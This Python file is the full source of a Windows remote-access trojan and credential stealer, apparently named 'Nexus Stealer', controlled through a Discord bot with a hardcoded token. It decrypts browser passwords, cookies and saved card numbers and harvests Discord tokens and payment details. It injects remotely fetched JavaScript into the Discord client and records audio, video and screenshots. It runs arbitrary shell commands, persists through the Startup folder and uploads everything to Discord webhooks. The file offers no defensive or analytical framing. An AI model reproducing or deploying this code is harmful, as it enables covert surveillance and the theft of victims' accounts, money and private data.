import multiprocessing
import discord
import os
import sys
import subprocess
from discord.ext import commands
import requests
from PIL import ImageGrab
import io
import ctypes
import pyperclip
import pygetwindow as gw
import concurrent.futures
import zipfile
import base64
import json
import shutil
import sqlite3
from pathlib import Path
from zipfile import ZipFile
import re
import subprocess
import psutil
from Crypto.Cipher import AES
from discord import Embed, File, SyncWebhook
from win32crypt import CryptUnprotectData
from base64 import b64decode
from os import getlogin, listdir
from json import loads
from urllib.request import Request, urlopen
import time
from collections import Counter
from io import BytesIO
import pyaudio
import wave
from Crypto.Cipher import AES
from discord import Embed, File, SyncWebhook
from win32crypt import CryptUnprotectData
from re import findall
import cv2
import numpy as np
import pyautogui
import threading
import win32gui
import win32con


__LOGINS__ = []
__COOKIES__ = []
__WEB_HISTORY__ = []
__DOWNLOADS__ = []
__CARDS__ = []
tokens11 = []
cleaned = []
checker = []
token911 = []

token9900 = 'MTEzODQ1MzYzNzgzMjY0MjYxMQ.GUOPmC.z1BrZOcCxQ0-9NvwzQFhna9qqQTUM5u3mvdbfU'
guild_id = 1128712704950009987

def hide_console():
    win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def create_zip(source_path, zip_filename):
    with zipfile.ZipFile(zip_filename + ".zip", 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(source_path):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, source_path)
                zipf.write(file_path, arcname)

def send_to_discord_webhook(zip_filename, webhook_url):
    with open(zip_filename + ".zip", 'rb') as file:
        files = {'file': file}
        response = requests.post(webhook_url, files=files)

    if response.status_code == 200:
        print("File sent successfully to Discord webhook.")
    else:
        print("Error sending file to Discord webhook:", response.text)

class NexusInjection:
    def __init__(self, webhook: str) -> None:
        self.appdata = os.getenv('LOCALAPPDATA')
        self.discord_dirs = [
            self.appdata + '\\Discord',
            self.appdata + '\\DiscordCanary',
            self.appdata + '\\DiscordPTB',
            self.appdata + '\\DiscordDevelopment'
        ]
        self.code = requests.get(
            'https://raw.githubusercontent.com/NexusTestGithub/injection/main/index.js').text

        for proc in psutil.process_iter():
            if 'discord' in proc.name().lower():
                proc.kill()

        for dir in self.discord_dirs:
            if not os.path.exists(dir):
                continue

            if self.get_core(dir) is not None:
                with open(self.get_core(dir)[0] + '\\index.js', 'w', encoding='utf-8') as f:
                    f.write((self.code).replace('discord_desktop_core-1',
                            self.get_core(dir)[1]).replace('%WEBHOOK%', webhook))
                    self.start_discord(dir)

    def get_core(self, dir: str) -> tuple:
        for file in os.listdir(dir):
            if re.search(r'app-+?', file):
                modules = dir + '\\' + file + '\\modules'
                if not os.path.exists(modules):
                    continue
                for file in os.listdir(modules):
                    if re.search(r'discord_desktop_core-+?', file):
                        core = modules + '\\' + file + '\\' + 'discord_desktop_core'
                        if not os.path.exists(core + '\\index.js'):
                            continue

                        return core, file

    def start_discord(self, dir: str) -> None:
        update = dir + '\\Update.exe'
        executable = dir.split('\\')[-1] + '.exe'

        for file in os.listdir(dir):
            if re.search(r'app-+?', file):
                app = dir + '\\' + file
                if os.path.exists(app + '\\' + 'modules'):
                    for file in os.listdir(app):
                        if file == executable:
                            executable = app + '\\' + executable
                            subprocess.call([update, '--processStart', executable],
                                            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                            
def record_and_send(webhook_url):
    chunk = 1024
    sample_format = pyaudio.paInt16  
    channels = 2
    fs = 44100 
    duration = 120

    p = pyaudio.PyAudio()  

    while True:
        print('Recording')

        stream = p.open(format=sample_format,
                        channels=channels,
                        rate=fs,
                        frames_per_buffer=chunk,
                        input=True)

        frames = [] 

        for i in range(0, int(fs / chunk * duration)):
            data = stream.read(chunk)
            frames.append(data)

        stream.stop_stream()
        stream.close()

        print('Finished recording')

        audio_buffer = io.BytesIO()
        wf = wave.open(audio_buffer, 'wb')
        wf.setnchannels(channels)
        wf.setsampwidth(p.get_sample_size(sample_format))
        wf.setframerate(fs)
        wf.writeframes(b''.join(frames))
        wf.close()

        audio_buffer.seek(0)


        files = {'file': ('audio.wav', audio_buffer, 'audio/wav')}
        response = requests.post(webhook_url, files=files)

        print('Audio sent to Discord')

def record_screen(duration):
    screen_size = (pyautogui.size().width, pyautogui.size().height)
    fourcc = cv2.VideoWriter_fourcc(*'mp4v')
    fps = 20.0

    frames = []
    start_time = time.time()

    while (time.time() - start_time) < duration:
        screenshot = pyautogui.screenshot()
        frame = np.array(screenshot)

        frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)

        frames.append(frame)

    out = cv2.VideoWriter("temp_video.mp4", fourcc, fps, screen_size)

    for frame in frames:
        out.write(frame)

    out.release()

    with open("temp_video.mp4", "rb") as f:
        video_bytes = f.read()

    return video_bytes

def send_video_to_webhook(video_bytes, webhook):
    files = {"file": ("video.mp4", video_bytes)}
    requests.post(webhook, files=files)
    os.remove("temp_video.mp4")

def get_payment_methods(token):
    url = 'https://discord.com/api/v9/users/@me/billing/payment-sources'
    headers = {'Authorization': token}

    payment_method_mapping = {
        1: "Credit Card",
        2: "PayPal",
        3: "Apple Pay",
        4: "Google Pay",
        5: "Paysafecard",
    }

    response = requests.get(url, headers=headers)

    try:
        response_data = response.json()
        if isinstance(response_data, list):
            payment_methods = [payment_method_mapping.get(payment_method.get('type'), "Unknown") for payment_method in response_data]
        else:
             payment_methods = []
    except json.JSONDecodeError:
        payment_methods = []

        return payment_methods
ROAMING = os.getenv("APPDATA")

class DiscordTokenGrabber:
    def __init__(self):
        self.tokens = set()
        self.tokens2 = set()
        self.valid_tokens = []



    def check_token(self, token):
        headers = {
            'Authorization': f'{token}'
        }
        response = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
        if response.status_code == 200:
            return True
        else:
            return False

    def decrypt(self, buff, master_key):
        try:
            return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
        except:
            return "Error"
        
    def get_tokens2(self):
        paths = {
            "Discord"           : ROAMING + "\\Discord",
            "Discord Canary"    : ROAMING + "\\discordcanary",
            "Discord PTB"       : ROAMING + "\\discordptb",
            'Discord': os.getenv("APPDATA") + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': os.getenv("APPDATA") + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': os.getenv("APPDATA") + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': os.getenv("APPDATA") + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': os.getenv("APPDATA") + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': os.getenv("LOCALAPPDATA") + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': os.getenv("LOCALAPPDATA") + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': os.getenv("LOCALAPPDATA") + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': os.getenv("LOCALAPPDATA") + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': os.getenv("LOCALAPPDATA") + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': os.getenv("LOCALAPPDATA") + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': os.getenv("LOCALAPPDATA") + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': os.getenv("LOCALAPPDATA") + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': os.getenv("LOCALAPPDATA") + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': os.getenv("LOCALAPPDATA") + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': os.getenv("LOCALAPPDATA") + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Uran': os.getenv("LOCALAPPDATA") + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': os.getenv("LOCALAPPDATA") + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': os.getenv("LOCALAPPDATA") + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': os.getenv("LOCALAPPDATA") + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"

        for name, path in paths.items():
            if not os.path.exists(path):
                continue

            for file_name in os.listdir(path):
                if file_name[-3:] not in ["log", "ldb"]:
                    continue

                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for token in re.findall(regexp, line):
                            headers = {'Authorization': f'{token}'}
                            response = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
                            if response.status_code == 200:
                                self.tokens.add(token)

    def extract_tokens(self):
        local = os.getenv('LOCALAPPDATA')
        roaming = os.getenv('APPDATA')
        chrome = local + "\\Google\\Chrome\\User Data"
        paths = {
            'Discord': roaming + '\\discord',
            'Discord Canary': roaming + '\\discordcanary',
            'Lightcord': roaming + '\\Lightcord',
            'Discord PTB': roaming + '\\discordptb',
            'Opera': roaming + '\\Opera Software\\Opera Stable',
            'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
            'Amigo': local + '\\Amigo\\User Data',
            'Torch': local + '\\Torch\\User Data',
            'Kometa': local + '\\Kometa\\User Data',
            'Orbitum': local + '\\Orbitum\\User Data',
            'CentBrowser': local + '\\CentBrowser\\User Data',
            '7Star': local + '\\7Star\\7Star\\User Data',
            'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
            'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
            'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
            'Chrome': chrome + 'Default',
            'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
            'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Defaul',
            'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
            'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
            'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
            'Iridium': local + '\\Iridium\\User Data\\Default'
        }
        for platform, path in paths.items():
            if not os.path.exists(path): continue
            try:
                with open(path + f"\\Local State", "r") as file:
                    key = loads(file.read())['os_crypt']['encrypted_key']
                    file.close()
            except: continue
            for file in listdir(path + f"\\Local Storage\\leveldb\\"):
                if not file.endswith(".ldb") and file.endswith(".log"): continue
                else:
                    try:
                        with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
                            for x in files.readlines():
                                x.strip()
                                for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                                    tokens11.append(values)
                    except PermissionError: continue
            for i in tokens11:
                if i.endswith("\\"):
                    i.replace("\\", "") 
                elif i not in cleaned:
                    cleaned.append(i)
            for token in cleaned:
                try:
                    token = self.decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
                except IndexError == "Error": continue
                self.tokens.add(token)



    def create_user_embed(self, token):
        headers = {
            'Authorization': f'{token}'
        }
        user_info_response = requests.get('https://discord.com/api/v9/users/@me', headers=headers)

        if user_info_response.status_code == 200:
            user_info = user_info_response.json()

            payment_methods = get_payment_methods(token)

            user_embed = {
               "title": user_info['username'],
               "description": f"**Token Info:**\n```"
                                f"email: {user_info['email']}\n"
                                f"phone: {user_info['phone']}\n"
                                f"2fa: {'Enabled' if user_info['mfa_enabled'] else 'Disabled'}\n"
                                f"payment methodes: {', '.join(payment_methods) if payment_methods else 'N/A'}"
                                "```"
                                f"**TOKEN:**\n"
                                f"```{token}```",
                "color": 13574896,
                "thumbnail": {
                    "url": f"https://cdn.discordapp.com/avatars/{user_info['id']}/{user_info['avatar']}.png"
                }
            }
            return user_embed
        return None





    def send_tokens_webhook(self, webhook):
        global token911
        response = requests.get("https://api.ipify.org?format=json")
        data = response.json()
        ip_address = data['ip']
        self.valid_tokens = [token for token in self.tokens if self.check_token(token)]
        token_list = "\n".join(self.valid_tokens)
        token911.extend(self.valid_tokens)
        webhook_url = webhook

        overall_embed = {
            "title": "NEXUS STEALER",
            "description": f"**system info:**\nip: {ip_address}\npc-username: {os.getenv('USERNAME')}\n\n"
                           f"**tokens:**\n```\n{token_list}\n```",
            "color": 13574896,
        }

        payload = {
            "avatar_url": "https://cdn.discordapp.com/attachments/1107999989440970852/1136007954546569416/RmDJt7xVhNFTA6yvy3EWfsTbki45EeI67K93h75F.png",
            "username": "Nexus Stealer",
            "content": None,
            "embeds": [overall_embed],
            "attachments": []
            
        }
        requests.post(webhook_url, json=payload)

        for token in self.valid_tokens:
            user_embed = self.create_user_embed(token)
            if user_embed:
                payload = {
                    "avatar_url": "https://cdn.discordapp.com/attachments/1107999989440970852/1136007954546569416/RmDJt7xVhNFTA6yvy3EWfsTbki45EeI67K93h75F.png",
                    "username": "Nexus Stealer",
                    "content": None,
                    "embeds": [user_embed],
                    "attachments": []
                }
                requests.post(webhook_url, json=payload)


    def steal_tokens(self, webhook): 
        self.extract_tokens()
        self.get_tokens2()
        self.send_tokens_webhook(webhook)

class Browsers:
    def __init__(self, webhook):
        self.webhook = SyncWebhook.from_url(webhook)

        Chromium()
        Upload(self.webhook)


class Upload:
    def __init__(self, webhook: SyncWebhook):
        self.webhook = webhook

        self.write_files()
        self.send()
        self.clean()

    def write_files(self):
        os.makedirs("vault", exist_ok=True)
        if __LOGINS__:
            with open("vault\\logins.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __LOGINS__))

        if __COOKIES__:
            with open("vault\\cookies.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __COOKIES__))

        if __WEB_HISTORY__:
            with open("vault\\web_history.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __WEB_HISTORY__))

        if __DOWNLOADS__:
            with open("vault\\downloads.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __DOWNLOADS__))

        if __CARDS__:
            with open("vault\\cards.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __CARDS__))

        with ZipFile("vault.zip", "w") as zip:
            for file in os.listdir("vault"):
                zip.write(f"vault\\{file}", file)

    def send(self):
        self.webhook.send(
            embed=Embed(
                title="Vault",
                description="```" +
                '\n'.join(self.tree(Path("vault"))) + "```",
            ),
            file=File("vault.zip"),
            username="Nexus Rat",
        )

    def clean(self):
        shutil.rmtree("vault")
        os.remove("vault.zip")

    def tree(self, path: Path, prefix: str = '', midfix_folder: str = '📂 - ', midfix_file: str = '📄 - '):
        pipes = {
            'space':  '    ',
            'branch': '│   ',
            'tee':    '├── ',
            'last':   '└── ',
        }

        if prefix == '':
            yield midfix_folder + path.name

        contents = list(path.iterdir())
        pointers = [pipes['tee']] * (len(contents) - 1) + [pipes['last']]
        for pointer, path in zip(pointers, contents):
            if path.is_dir():
                yield f"{prefix}{pointer}{midfix_folder}{path.name} ({len(list(path.glob('**/*')))} files, {sum(f.stat().st_size for f in path.glob('**/*') if f.is_file()) / 1024:.2f} kb)"
                extension = pipes['branch'] if pointer == pipes['tee'] else pipes['space']
                yield from self.tree(path, prefix=prefix+extension)
            else:
                yield f"{prefix}{pointer}{midfix_file}{path.name} ({path.stat().st_size / 1024:.2f} kb)"


class Chromium:
    def __init__(self):
        self.appdata = os.getenv('LOCALAPPDATA')
        self.browsers = {
            'amigo': self.appdata + '\\Amigo\\User Data',
            'torch': self.appdata + '\\Torch\\User Data',
            'kometa': self.appdata + '\\Kometa\\User Data',
            'orbitum': self.appdata + '\\Orbitum\\User Data',
            'cent-browser': self.appdata + '\\CentBrowser\\User Data',
            '7star': self.appdata + '\\7Star\\7Star\\User Data',
            'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
            'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
            'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': self.appdata + '\\Iridium\\User Data',
        }
        self.profiles = [
            'Default',
            'Profile 1',
            'Profile 2',
            'Profile 3',
            'Profile 4',
            'Profile 5',
        ]

        for _, path in self.browsers.items():
            if not os.path.exists(path):
                continue

            self.master_key = self.get_master_key(f'{path}\\Local State')
            if not self.master_key:
                continue

            for profile in self.profiles:
                if not os.path.exists(path + '\\' + profile):
                    continue

                operations = [
                    self.get_login_data,
                    self.get_cookies,
                    self.get_web_history,
                    self.get_downloads,
                    self.get_credit_cards,
                ]

                for operation in operations:
                    try:
                        operation(path, profile)
                    except Exception as e:
                        # print(e)
                        pass

    def get_master_key(self, path: str) -> str:
        if not os.path.exists(path):
            return

        if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
            return

        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()

        return decrypted_pass

    def get_login_data(self, path: str, profile: str):
        login_db = f'{path}\\{profile}\\Login Data'
        if not os.path.exists(login_db):
            return

        shutil.copy(login_db, 'login_db')
        conn = sqlite3.connect('login_db')
        cursor = conn.cursor()
        cursor.execute(
            'SELECT action_url, username_value, password_value FROM logins')
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2]:
                continue

            password = self.decrypt_password(row[2], self.master_key)
            __LOGINS__.append(Types.Login(row[0], row[1], password))

        conn.close()
        os.remove('login_db')

    def get_cookies(self, path: str, profile: str):
        cookie_db = f'{path}\\{profile}\\Network\\Cookies'
        if not os.path.exists(cookie_db):
            return

        try:
            shutil.copy(cookie_db, 'cookie_db')
            conn = sqlite3.connect('cookie_db')
            cursor = conn.cursor()
            cursor.execute(
                'SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies')
            for row in cursor.fetchall():
                if not row[0] or not row[1] or not row[2] or not row[3]:
                    continue

                cookie = self.decrypt_password(row[3], self.master_key)
                __COOKIES__.append(Types.Cookie(
                    row[0], row[1], row[2], cookie, row[4]))

            conn.close()
        except Exception as e:
            print(e)

        os.remove('cookie_db')

    def get_web_history(self, path: str, profile: str):
        web_history_db = f'{path}\\{profile}\\History'
        if not os.path.exists(web_history_db):
            return

        shutil.copy(web_history_db, 'web_history_db')
        conn = sqlite3.connect('web_history_db')
        cursor = conn.cursor()
        cursor.execute('SELECT url, title, last_visit_time FROM urls')
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2]:
                continue

            __WEB_HISTORY__.append(Types.WebHistory(row[0], row[1], row[2]))

        conn.close()
        os.remove('web_history_db')

    def get_downloads(self, path: str, profile: str):
        downloads_db = f'{path}\\{profile}\\History'
        if not os.path.exists(downloads_db):
            return

        shutil.copy(downloads_db, 'downloads_db')
        conn = sqlite3.connect('downloads_db')
        cursor = conn.cursor()
        cursor.execute('SELECT tab_url, target_path FROM downloads')
        for row in cursor.fetchall():
            if not row[0] or not row[1]:
                continue

            __DOWNLOADS__.append(Types.Download(row[0], row[1]))

        conn.close()
        os.remove('downloads_db')

    def get_credit_cards(self, path: str, profile: str):
        cards_db = f'{path}\\{profile}\\Web Data'
        if not os.path.exists(cards_db):
            return

        shutil.copy(cards_db, 'cards_db')
        conn = sqlite3.connect('cards_db')
        cursor = conn.cursor()
        cursor.execute(
            'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2] or not row[3]:
                continue

            card_number = self.decrypt_password(row[3], self.master_key)
            __CARDS__.append(Types.CreditCard(
                row[0], row[1], row[2], card_number, row[4]))

        conn.close()
        os.remove('cards_db')


class Types:
    class Login:
        def __init__(self, url, username, password):
            self.url = url
            self.username = username
            self.password = password

        def __str__(self):
            return f'{self.url}\t{self.username}\t{self.password}'

        def __repr__(self):
            return self.__str__()

    class Cookie:
        def __init__(self, host, name, path, value, expires):
            self.host = host
            self.name = name
            self.path = path
            self.value = value
            self.expires = expires

        def __str__(self):
            return f'{self.host}\t{"FALSE" if self.expires == 0 else "TRUE"}\t{self.path}\t{"FALSE" if self.host.startswith(".") else "TRUE"}\t{self.expires}\t{self.name}\t{self.value}'

        def __repr__(self):
            return self.__str__()

    class WebHistory:
        def __init__(self, url, title, timestamp):
            self.url = url
            self.title = title
            self.timestamp = timestamp

        def __str__(self):
            return f'{self.url}\t{self.title}\t{self.timestamp}'

        def __repr__(self):
            return self.__str__()

    class Download:
        def __init__(self, tab_url, target_path):
            self.tab_url = tab_url
            self.target_path = target_path

        def __str__(self):
            return f'{self.tab_url}\t{self.target_path}'

        def __repr__(self):
            return self.__str__()

    class CreditCard:
        def __init__(self, name, month, year, number, date_modified):
            self.name = name
            self.month = month
            self.year = year
            self.number = number
            self.date_modified = date_modified

        def __str__(self):
            return f'{self.name}\t{self.month}\t{self.year}\t{self.number}\t{self.date_modified}'

        def __repr__(self):
            return self.__str__()

def get_location():
    response = requests.get('https://api64.ipify.org?format=json')
    ip_data = response.json()
    ip_address = ip_data['ip']
    response = requests.get(f'https://ipinfo.io/{ip_address}/json')
    location_data = response.json()

    return location_data

def copy_to_startup():
    startup_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    current_script_path = sys.argv[0]
    script_name = os.path.basename(current_script_path)
    destination_path = os.path.join(startup_dir, script_name)
    shutil.copy(current_script_path, destination_path)

def error_message(message, error_title):
    ctypes.windll.user32.MessageBoxW(None, f'{message}', f'{error_title}', 0)


def search_folder(root_path, target_folder):
    found_folders = []
    for root, dirs, files in os.walk(root_path):
        if target_folder in dirs:
            folder_path = os.path.join(root, target_folder)
            drive, _ = os.path.splitdrive(folder_path)
            found_folders.append((folder_path, drive))
    return found_folders


intents = discord.Intents().all()
bot = commands.Bot(command_prefix="*", status=discord.Status.online, activity=discord.Activity(type=discord.ActivityType.playing, name="Ratet"), intents=intents)

def send_ss(webhook):
    screenshot = ImageGrab.grab(bbox=None, include_layered_windows=False, all_screens=True, xdisplay=None)

    buffer = io.BytesIO()
    screenshot.save(buffer, format="PNG")
    buffer.seek(0)

    files = {'file': ('screenshot.png', buffer, 'image/png')}
    data = {'content': 'Screenshot from the system:'}

    requests.post(webhook, files=files, data=data)

@bot.command()
async def test(ctx):
    await ctx.send("yo")

@bot.command()
async def steal_browsers(ctx):
    await ctx.send("procsessing...")
    guild_id = ctx.guild.id
    channel_id = ctx.channel.id
    guild = ctx.guild  
    channel = guild.get_channel(channel_id)
    webhook1 = await channel.create_webhook(name="My Webhook")
    webhook = f"https://discord.com/api/webhooks/{webhook1.id}/{webhook1.token}"
    Browsers(webhook)

@bot.command()
async def video(ctx, duration: int):
    await ctx.send("procsessing...")
    guild_id = ctx.guild.id
    channel_id = ctx.channel.id
    guild = ctx.guild  
    channel = guild.get_channel(channel_id)
    webhook1 = await channel.create_webhook(name="My Webhook")
    webhook = f"https://discord.com/api/webhooks/{webhook1.id}/{webhook1.token}"
    await ctx.send(f"starting recording for {duration} secondes")
    video_bytes = record_screen(duration)
    send_video_to_webhook(video_bytes, webhook)

@bot.command()
async def steal_discord(ctx):
    await ctx.send("procsessing...")
    guild_id = ctx.guild.id
    channel_id = ctx.channel.id
    guild = ctx.guild  
    channel = guild.get_channel(channel_id)
    webhook1 = await channel.create_webhook(name="My Webhook")
    webhook = f"https://discord.com/api/webhooks/{webhook1.id}/{webhook1.token}"
    Nexus = DiscordTokenGrabber()
    Nexus.steal_tokens(webhook)

@bot.command()
async def ss(ctx):
    await ctx.send("procsessing...")
    guild_id = ctx.guild.id
    channel_id = ctx.channel.id
    guild = ctx.guild  
    channel = guild.get_channel(channel_id)
    webhooks6 = await channel.webhooks()
    for webhook in webhooks6:
        await webhook.delete()
    webhook = await channel.create_webhook(name="Nexus Logger")
    webhook_url = f"https://discord.com/api/webhooks/{webhook.id}/{webhook.token}"
    send_ss(webhook_url)

@bot.command()
async def inject(ctx, webhook_url):
    await ctx.send(f"Injecting Discord to webhook: {webhook_url}")
    webhook = webhook_url
    NexusInjection(webhook)

@bot.command()
async def shell(ctx, command):
    os.system(f"{command}")

@bot.command()
async def message(ctx, error_title, message):
    await ctx.send("message send")
    error_message(message, error_title)

@bot.command()
async def clipboard(ctx):
    clipboard_content = pyperclip.paste()
    await ctx.send(f"Clipboard content:\n```\n{clipboard_content}\n```")

@bot.command()
async def restart_pc(ctx):
    await ctx.send(f"Restarting Infectet pc")
    os.system("shutdown /r")

@bot.command()
async def shutdown_pc(ctx):
    await ctx.send(f"Shutdown Infectet pc")
    os.system("shutdown /s")

@bot.command()
async def show_startup(ctx):
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    
    if not os.path.exists(startup_folder):
        await ctx.send("Error: Startup folder not found.")
        return
    
    for item in os.listdir(startup_folder):
        if item.lower() != 'desktop.ini':  
            await ctx.send(item)
    else:
        await ctx.send("nothing found.")
    
    if len(os.listdir(startup_folder)) == 0:
        await ctx.send("No startup items found.")

@bot.command()
async def add_startup(ctx):
    await ctx.send("adding to startup..")
    copy_to_startup()
    await ctx.send("added to startup")

@bot.command()
async def geo_locate(ctx):
    location = get_location()
    message = f"```\nIP Address: {location.get('ip')}\nCity: {location.get('city')}\nRegion: {location.get('region')}\nCountry: {location.get('country')}\n```"
    await ctx.send(message)


@bot.command()
async def list_open_windows(ctx):
    open_windows = gw.getWindowsWithTitle('')
    
    windows_with_titles = [window for window in open_windows if window.title != ""]

    windows12 = []
    for idx, window in enumerate(windows_with_titles, start=1):
        window_title = window.title
        if os.path.isdir(window_title):
            window_title = os.path.abspath(window_title)
        windows12.append(f"[{idx}] {window_title}")

    if windows12:
        await ctx.send("Open Windows:")
        await ctx.send("```" + "\n".join(windows12) + "```")
    else:
        await ctx.send("No open windows found.")

@bot.command()
async def close(ctx, number: int):
    open_windows = gw.getWindowsWithTitle('')
    
    windows_with_titles = [window for window in open_windows if window.title != ""]

    if 1 <= number <= len(windows_with_titles):
        window_to_close = windows_with_titles[number - 1]
        ctypes.windll.user32.PostMessageW(window_to_close._hWnd, 0x0010, 0, 0) 
        await ctx.send(f"Closed window: [{number}] {window_to_close.title}")
    else:
        await ctx.send("Invalid window number.")

@bot.command()
async def search(ctx, target_folder_name):
    await ctx.send("Be patient this can take up to 5 minutes..")
    drives = ['C:', 'D:', 'E:', 'F:', 'G:', 'H:']  

    with concurrent.futures.ThreadPoolExecutor() as executor:
        future_to_drive = {executor.submit(search_folder, drive + '\\', target_folder_name): drive for drive in drives}

        for future in concurrent.futures.as_completed(future_to_drive):
            drive = future_to_drive[future]
            try:
                found_folders = future.result()
                for folder_path, drive in found_folders:
                    await ctx.send(f"Found '{target_folder_name}' at: {folder_path}")
            except Exception as e:
                await ctx.xsend(f"An error occurred while searching drive {drive}: {e}")

@bot.command()
async def send_dir(ctx, source_path, zip_filename):
    await ctx.send("procsessing...")
    guild_id = ctx.guild.id
    channel_id = ctx.channel.id
    guild = ctx.guild  
    channel = guild.get_channel(channel_id)
    webhooks6 = await channel.webhooks()
    for webhook in webhooks6:
        await webhook.delete()
    webhook = await channel.create_webhook(name="Nexus Logger")
    webhook_url = f"https://discord.com/api/webhooks/{webhook.id}/{webhook.token}"
    create_zip(source_path, zip_filename)
    send_to_discord_webhook(zip_filename, webhook_url)
    os.remove(zip_filename + ".zip")

@bot.event
async def on_ready(ctx):
    global guild_id
    guild_id = guild_id
    channel_name = 'audio_log'
    guild = bot.get_guild(guild_id)
    existing_channel = discord.utils.get(guild.channels, name=channel_name)
    if not existing_channel:
        new_channel = await guild.create_text_channel(channel_name)
    else:
        print("")
    webhook_name = 'Nexus Logger'
    webhooks6 = await existing_channel.webhooks()
    for webhook in webhooks6:
         await webhook.delete()
    webhook = await existing_channel.create_webhook(name=webhook_name)
